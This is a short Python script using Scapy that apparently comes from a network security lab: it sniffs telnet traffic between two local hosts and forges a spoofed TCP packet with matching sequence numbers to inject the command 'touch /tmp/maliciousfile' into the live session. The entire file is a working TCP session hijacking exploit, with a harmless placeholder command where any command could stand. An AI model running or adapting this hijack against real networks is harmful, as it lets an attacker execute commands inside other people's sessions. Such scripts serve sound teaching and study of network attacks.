#!/bin/env python3

from scapy.all import *


def spoof(pkt):
    global IP
    pre_ip = pkt[IP]
    from scapy.layers.inet import TCP
    pre_tcp = pkt[TCP]

    from scapy.layers.inet import IP
    ip = IP(src=pre_ip.dst, dst=pre_ip.src)
    tcp = TCP(sport=pre_tcp.dport, dport=pre_tcp.sport, flags="A", seq=pre_tcp.ack + 10, ack=pre_tcp.seq + 1)
    data = "\r touch /tmp/maliciousfile\n"

    pkt = ip / tcp / data
    pkt.show()
    send(pkt, verbose=0)
    quit()


sniff(iface='br-ec4ac5c9be27', filter='tcp and dst host 10.9.0.6 and src host 10.9.0.5 and src port 23', prn=spoof)
